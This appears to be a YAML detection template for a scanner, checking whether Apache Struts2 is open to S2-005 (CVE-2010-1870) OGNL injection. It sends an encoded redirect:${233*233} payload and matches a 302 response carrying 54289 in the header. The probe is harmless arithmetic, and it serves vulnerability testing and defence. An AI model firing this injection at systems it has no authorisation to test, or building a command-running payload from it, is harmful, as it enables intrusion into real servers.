id: local-struts2-s2-005-math

info:
  name: Struts2 S2-005 OGNL Injection via redirect: prefix (CVE-2010-1870)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-005 (CVE-2010-1870) OGNL injection via redirect: prefix parameter.
    Safe math probe: redirect:${233*233} evaluates to 54289 in Location redirect header.
    Similar to S2-016 but affects older versions 2.0.0 - 2.1.8.1.
  reference:
    - https://struts.apache.org/docs/s2-005.html
    - https://nvd.nist.gov/vuln/detail/CVE-2010-1870
  tags: safe-poc,struts2,s2-005,cve,cve2010,ognl,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/example/HelloWorld.action?redirect:%24%7B233*233%7D"
      - "{{BaseURL}}/index.action?redirect:%24%7B233*233%7D"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "54289"
      - type: status
        status:
          - 302
